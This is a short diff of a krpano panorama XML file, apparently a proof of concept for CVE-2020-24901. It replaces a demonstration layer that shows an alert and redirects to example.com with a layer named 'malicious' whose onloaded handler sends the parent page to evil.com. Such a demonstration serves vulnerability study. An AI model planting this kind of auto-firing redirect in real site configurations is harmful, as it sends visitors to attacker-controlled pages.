@@ -1,6 +1,6 @@
 <krpano>
-    <layer name="poc_demo" 
+    <layer name="malicious" 
            type="container" 
            visible="true" 
-           onloaded="js(alert('CVE-2020-24901 Vulnerability Demonstrated');console.log('PoC would redirect to: example.com');window.location.href = 'https://example.com';)"/>
+           onloaded="openurl('https://evil.com', _parent);"/>
 </krpano>
